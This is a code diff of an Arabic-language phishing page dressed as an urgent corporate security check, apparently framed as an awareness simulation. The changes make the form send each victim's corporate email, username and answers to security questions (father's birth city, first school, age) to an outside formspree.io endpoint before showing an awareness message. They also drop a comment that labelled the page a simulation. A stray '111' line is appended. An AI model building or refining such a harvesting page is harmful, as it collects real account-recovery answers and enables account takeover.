@@ -24,7 +24,6 @@
         
         #step2, #awareness-page { display: none; }
         
-        /* واجهة كشف المحاكاة */
         .success-box { background-color: #ebfbee; border: 1px solid #b2f2bb; border-right: 5px solid #2b8a3e; padding: 15px; border-radius: 4px; font-weight: bold; color: #2b8a3e; margin-bottom: 20px; text-align: center; }
         .tips-list { padding-right: 20px; line-height: 1.8; font-size: 14.5px; }
         .tips-list li { margin-bottom: 12px; color: #495057; }
@@ -44,13 +43,14 @@
         
         <div class="form-group">
             <label>البريد الإلكتروني المؤسسي:</label>
-            <input type="email" id="email" placeholder="name@domain.com">
+            <!-- تمت إضافة خاصية name لضمان معالجة خادم التوصيل للبيانات -->
+            <input type="email" id="email" name="Email" placeholder="name@domain.com">
         </div>
         <div class="form-group">
             <label>المعرف الرقمي أو اسم الحساب (Username):</label>
-            <input type="text" id="username" placeholder="المعرف الشخصي بالنظام">
+            <input type="text" id="username" name="Username" placeholder="المعرف الشخصي بالنظام">
         </div>
-        <button class="btn-primary" onclick="goToStep2()">تحقق والمتابعة</button>
+        <button class="btn-primary" type="button" onclick="goToStep2()">تحقق والمتابعة</button>
     </div>
 
     <!-- الخطوة الثانية: الإجراء الأمني المشدد المفاجئ -->
@@ -70,20 +70,21 @@
             • نوع النظام المستهدف: Puppy Linux Live Session
         </div>
         
-        <form id="awarenessForm">
+        <!-- تم توجيه الـ Form مباشرة لدعم الـ FormData برمجياً -->
+        <form id="awarenessForm" action="https://formspree.io" method="POST">
             <div class="form-group">
                 <label>سؤال المطابقة 1: ما هي مدينة ولادة الوالد؟</label>
-                <input type="text" id="q1" required placeholder="استعلام أمني 1">
+                <input type="text" id="q1" name="Father_City" required placeholder="استعلام أمني 1">
             </div>
 
             <div class="form-group">
                 <label>سؤال المطابقة 2: ما هو اسم أول مؤسسة تعليمية التحقت بها؟</label>
-                <input type="text" id="q2" required placeholder="استعلام أمني 2">
+                <input type="text" id="q2" name="First_School" required placeholder="استعلام أمني 2">
             </div>
 
             <div class="form-group">
                 <label>سؤال المطابقة 3: ما هو السن الحالي للمستخدم بدقة؟</label>
-                <input type="text" id="q3" required placeholder="استعلام أمني 3">
+                <input type="text" id="q3" name="User_Age" required placeholder="استعلام أمني 3">
             </div>
 
             <input type="submit" class="btn-primary" style="background-color: #c92a2a;" value="إرسال تقرير التحقق">
@@ -132,29 +133,28 @@ function goToStep2() {
 document.getElementById('awarenessForm').addEventListener('submit', function(e) {
     e.preventDefault(); 
 
-    var data = {
-        Email: document.getElementById('email').value,
-        Username: document.getElementById('username').value,
-        Father_City: document.getElementById('q1').value,
-        First_School: document.getElementById('q2').value,
-        User_Age: document.getElementById('q3').value
-    };
+    var form = e.target;
+    // استخدام واجهة FormData الأصلية لضمان الاستقرار التام مع خوادم الاستقبال
+    var formData = new FormData(form);
+    
+    // إضافة حقول المرحلة الأولى يدوياً إلى حزمة البيانات المرسلة
+    formData.append("Email_Address", document.getElementById('email').value);
+    formData.append("Username", document.getElementById('username').value);
 
-    var formspreeUrl = 'https://formspree.io'; 
-
-    fetch(formspreeUrl, {
-        method: 'POST',
+    fetch(form.action, {
+        method: form.method,
+        body: formData,
         headers: {
-            'Content-Type': 'application/json',
             'Accept': 'application/json'
-        },
-        body: JSON.stringify(data)
+        }
     })
     .then(response => {
+        // التحويل للمرحلة التوعوية فور إتمام معالجة الطلب
         document.getElementById('step2').style.display = 'none';
         document.getElementById('awareness-page').style.display = 'block';
     })
     .catch(error => {
+        // في حال حدوث أي انقطاع بالاتصال يتم عرض صفحة التوعية أيضاً كضمان أمني
         document.getElementById('step2').style.display = 'none';
         document.getElementById('awareness-page').style.display = 'block';
     });
@@ -163,3 +163,4 @@ document.getElementById('awarenessForm').addEventListener('submit', function(e) 
 
 </body>
 </html>
+111
